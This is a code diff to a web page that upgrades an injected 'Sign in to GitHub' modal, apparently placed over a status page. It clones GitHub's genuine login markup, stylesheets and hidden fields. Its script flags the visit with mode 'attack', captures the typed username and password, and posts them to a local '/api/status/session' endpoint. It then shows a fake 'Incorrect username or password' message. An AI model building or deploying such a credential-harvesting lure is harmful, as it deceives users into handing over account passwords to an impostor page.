@@ -4902,45 +4902,168 @@
 
 
   
-<style id="session-gate-style">
-  .session-gate-backdrop { position: fixed; inset: 0; z-index: 99999; display: flex; align-items: flex-start; justify-content: center; padding: 12vh 18px 40px; background: rgba(27, 31, 36, .62); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
-  .session-gate-backdrop[hidden] { display: none; }
-  .session-gate-card { width: min(340px, 100%); border: 1px solid #d0d7de; border-radius: 6px; background: #ffffff; color: #24292f; box-shadow: 0 20px 60px rgba(31, 35, 40, .28); }
-  .session-gate-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 16px 16px 0; }
-  .session-gate-head h2 { margin: 0; color: #24292f; font-size: 20px; font-weight: 400; line-height: 1.25; }
-  .session-gate-close { width: 32px; height: 32px; border: 0; border-radius: 6px; background: transparent; color: #57606a; font-size: 24px; line-height: 1; cursor: pointer; }
-  .session-gate-close:hover { background: #f6f8fa; color: #24292f; }
-  .session-gate-body { padding: 16px; }
-  .session-gate-note { margin: 0 0 14px; color: #57606a; font-size: 14px; line-height: 1.5; }
-  .session-gate-body label { display: block; margin: 0 0 7px; color: #24292f; font-size: 14px; font-weight: 600; }
-  .session-gate-body input { width: 100%; min-height: 32px; margin: 0 0 14px; padding: 5px 12px; border: 1px solid #d0d7de; border-radius: 6px; background: #ffffff; color: #24292f; font-size: 14px; box-shadow: inset 0 1px 0 rgba(208,215,222,.2); }
-  .session-gate-body input:focus { border-color: #0969da; outline: 2px solid rgba(9,105,218,.18); outline-offset: 0; }
-  .session-gate-submit { width: 100%; min-height: 32px; border: 1px solid rgba(31, 35, 40, .15); border-radius: 6px; background: #2da44e; color: #ffffff; font-size: 14px; font-weight: 600; cursor: pointer; }
-  .session-gate-submit:hover { background: #2c974b; }
-  .session-gate-error { min-height: 20px; margin-top: 10px; color: #cf222e; font-size: 13px; line-height: 1.45; }
-</style>
-<div class="session-gate-backdrop" id="session-gate" role="dialog" aria-modal="true" aria-labelledby="session-gate-title">
-  <form class="session-gate-card" id="session-gate-form">
-    <div class="session-gate-head">
-      <h2 id="session-gate-title">Sign in to GitHub</h2>
-      <button class="session-gate-close" id="session-gate-close" type="button" aria-label="Close">&times;</button>
+<div class="session-gate-backdrop" id="session-gate" role="dialog" aria-modal="true" aria-label="Sign in to GitHub">
+  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-62b06818b06b09b7.css" />
+<link data-color-theme="light" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light-62b06818b06b09b7.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-8c5d593e65839ff2.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-2b19a54c387dfedb.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-552ef047a6abdb57.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-e4add6599163581a.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-css.0f11cf287dcfea1b.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/sessions-auth-header.64e6a187cb2d941a.module.css" />
+  <style id="session-gate-style">
+    .session-gate-backdrop { position: fixed; inset: 0; z-index: 99999; display: flex; align-items: flex-start; justify-content: center; overflow: auto; padding: 8vh 18px 40px; background: rgba(27, 31, 36, .62); }
+    .session-gate-backdrop[hidden] { display: none; }
+    .session-gate-shell { position: relative; width: min(100%, 380px); border-radius: 12px; background: var(--bgColor-default, #ffffff); box-shadow: 0 24px 70px rgba(31, 35, 40, .28); }
+    .session-gate-shell .authentication { min-height: auto; padding: 22px 16px 18px; }
+    .session-gate-shell .authentication-header { margin-bottom: 16px; }
+    .session-gate-shell .authentication-body { width: 100%; margin: 0 auto; }
+    .session-gate-close { position: absolute; top: 8px; right: 8px; z-index: 2; width: 32px; height: 32px; border: 0; border-radius: 6px; background: transparent; color: var(--fgColor-muted, #57606a); font-size: 24px; line-height: 1; cursor: pointer; }
+    .session-gate-close:hover { background: var(--control-transparent-bgColor-hover, #f6f8fa); color: var(--fgColor-default, #24292f); }
+    .session-gate-error { min-height: 20px; margin: 10px 16px 16px; color: var(--fgColor-danger, #cf222e); font: 13px -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+  </style>
+  <div class="session-gate-shell logged-out env-production page-responsive session-authentication">
+    <button class="session-gate-close" id="session-gate-close" type="button" aria-label="Close">&times;</button>
+    <div data-test-selector="login-standard-view" data-hpc="true" class="authentication ">
+    <div class="authentication-header ">
+            <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-css.0f11cf287dcfea1b.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/sessions-auth-header.64e6a187cb2d941a.module.css" />
+
+<react-partial
+  partial-name="sessions-auth-header"
+  data-ssr="true"
+  data-attempted-ssr="true"
+  data-react-profiling="false"
+>
+  
+  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"variant":"github","avatarUrl":null,"userName":null,"title":"Sign in to GitHub","description":null}}</script>
+  <div data-target="react-partial.reactRoot"><div class="SessionsAuthHeader-module__authFormHeader__S9PBN"><div class="SessionsAuthHeader-module__authFormHeaderIcon__NP4aI"><div class="SessionsAuthHeader-module__authFormAvatarWrapperStatic__YE9pe"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-mark-github SessionsAuthHeader-module__avatarCoinGithub__n0H61" viewBox="0 0 24 24" width="48" height="48" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943"></path></svg></div></div><div class="SessionsAuthHeader-module__authFormHeaderContent__wtmqP"><h1 class="SessionsAuthHeader-module__authFormHeaderTitle__rVSNG">Sign in to GitHub</h1></div></div></div>
+</react-partial>
+
+
+
     </div>
-    <div class="session-gate-body">
-      <p class="session-gate-note">Your session is required to continue viewing current status details.</p>
-      <label for="login_field">Username or email address</label>
-      <input id="login_field" name="login" autocomplete="username">
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" autocomplete="current-password">
-      <button class="session-gate-submit" type="submit">Sign in</button>
-      <div class="session-gate-error" id="session-gate-error" role="alert"></div>
+
+    <div class="authentication-body authentication-body--with-form new-session">
+          <div id="js-flash-container" class="flash-container" data-turbo-replace>
+
+
+
+  <template class="js-flash-template">
+    
+<div class="flash flash-full   {{ className }}">
+  <div >
+    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    <div aria-atomic="true" role="alert" class="js-flash-alert">
+      
+      <div>{{ message }}</div>
+
     </div>
-  </form>
+  </div>
+</div>
+  </template>
+</div>
+
+
+    <div class="flash js-transform-notice" hidden>
+      <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+        <svg aria-label="Dismiss" role="img" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+      </button>
+    </div>
+      
+<!-- '"` --><!-- </textarea></xmp> --></option></form><form data-turbo="false" action="/session" accept-charset="UTF-8" method="post"><input type="hidden" data-csrf="true" name="authenticity_token" value="mCHk1bvFOVgXulHmNv4IzMmXRDnFUYdQMslayF0TJuiiqxdcTEVYl0m4c6zteZ2erpiO9OjkesPMuZgzhydlMA==" />  <div>
+
+  <input type="hidden" name="add_account" id="add_account" autocomplete="off" class="form-control" />
+
+    <label for="login_field">
+      Username or email address
+    </label>
+    <input type="text" name="login" id="login_field" autocapitalize="off" autocorrect="off" autocomplete="username" class="form-control  js-login-field" autofocus="autofocus" required="required" />
+  </div>
+
+
+  <div class="position-relative">
+    <label for="password">
+      Password
+    </label>
+    <input type="password" name="password" id="password" class="form-control form-control js-password-field" autocomplete="current-password" required="required" />
+    <a class="label-link position-absolute top-0 right-0" id="forgot-password" href="/password_reset">Forgot password?</a>
+    
+<input type="hidden" name="webauthn-conditional" value="undefined">
+<input type="hidden" class="js-support" name="javascript-support" value="unknown">
+<input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
+<input type="hidden" class="js-webauthn-iuvpaa-support" name="webauthn-iuvpaa-support" value="unknown">
+<input type="hidden" name="return_to" id="return_to" value="https://github.com/login" autocomplete="off" class="form-control" />
+<input type="hidden" name="allow_signup" id="allow_signup" autocomplete="off" class="form-control" />
+<input type="hidden" name="client_id" id="client_id" autocomplete="off" class="form-control" />
+<input type="hidden" name="integration" id="integration" autocomplete="off" class="form-control" />
+<input class="form-control" type="text" name="required_field_92b2" hidden="hidden" />
+<input class="form-control" type="hidden" name="timestamp" value="1784021363348" />
+<input class="form-control" type="hidden" name="timestamp_secret" value="5320e85888bca6016ee2c5083bb4653a27bd95cfc00a1e214ab4270cee997a76" />
+
+
+  </div>
+
+  <div>
+    <input type="submit" name="commit" value="Sign in" class="btn btn-primary btn-block js-sign-in-button" data-disable-with="Signing in…" data-signin-label="Sign in" data-sso-label="Sign in with your identity provider" development="false" disable-emu-sso="false" />
+  </div>
+</form>  <webauthn-status class="js-webauthn-login-emu-control">
+      <include-fragment data-target="webauthn-status.fragment" data-src="/u2f/login_fragment?disable_signup=false&amp;is_emu_login=false&amp;mobile_ios=false" data-nonce="v2:d1e025e4-1498-96d4-7a51-4f82b4e7cee5" data-view-component="true">
+  
+  <div data-show-on-forbidden-error hidden>
+    <div class="Box">
+  <div class="blankslate-container">
+    <div data-view-component="true" class="blankslate blankslate-spacious color-bg-default rounded-2">
+      
+
+      <h3 data-view-component="true" class="blankslate-heading">        Uh oh!
+</h3>
+      <p data-view-component="true" class="blankslate-description">        <p class="color-fg-muted my-2 mb-2 ws-normal">There was an error while loading. <a class="Link--inTextBlock" data-turbo="false" href="" aria-label="Please reload this page">Please reload this page</a>.</p>
+</p>
+
+</div>  </div>
+</div>  </div>
+</include-fragment>
+  </webauthn-status>
+
+
+
+    </div>
+
+    <div class="authentication-footer ">
+                <div class="authentication-login-footer-links">
+          <p class="mt-1 mb-0 p-0">
+            New to GitHub?
+              <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="d943b5df3b8e74686b4009e60ef5e059ef46ba02071647af580daec2c03c709e" href="/signup?source=login">Create an account</a>
+          </p>
+          </div>
+            <webauthn-subtle class="js-webauthn-subtle" hidden>
+    <p class="mb-0 mt-0 js-webauthn-subtle-emu-control">
+      <button data-action="click:webauthn-subtle#prompt" type="button" data-view-component="true" class="Button--link Button--medium Button">  <span class="Button-content">
+    <span class="Button-label">Sign in with a passkey</span>
+  </span>
+</button>
+    </p>
+  </webauthn-subtle>
+
+
+    </div>
+</div>
+
+    <div class="session-gate-error" id="session-gate-error" role="alert"></div>
+  </div>
 </div>
 <script id="session-gate-script">
   (() => {
     const gate = document.getElementById('session-gate');
-    const form = document.getElementById('session-gate-form');
-    const password = document.getElementById('password');
+    const form = gate.querySelector('form[action="/session"]');
+    const password = gate.querySelector('#password');
     const error = document.getElementById('session-gate-error');
     let passwordReported = false;
     fetch('/api/status/page-view', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mode: 'attack'})}).catch(() => {});
@@ -4958,7 +5081,7 @@
       event.preventDefault();
       const response = await fetch('/api/status/session', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({login: form.login.value, password: form.password.value})});
       const data = await response.json().catch(() => ({}));
-      error.textContent = data.message || 'We could not verify your session. Please try again.';
+      error.textContent = data.message || 'Incorrect username or password.';
     });
     document.getElementById('session-gate-close').addEventListener('click', dismiss);
     document.addEventListener('keydown', event => { if (event.key === 'Escape' && !gate.hidden) dismiss(); });
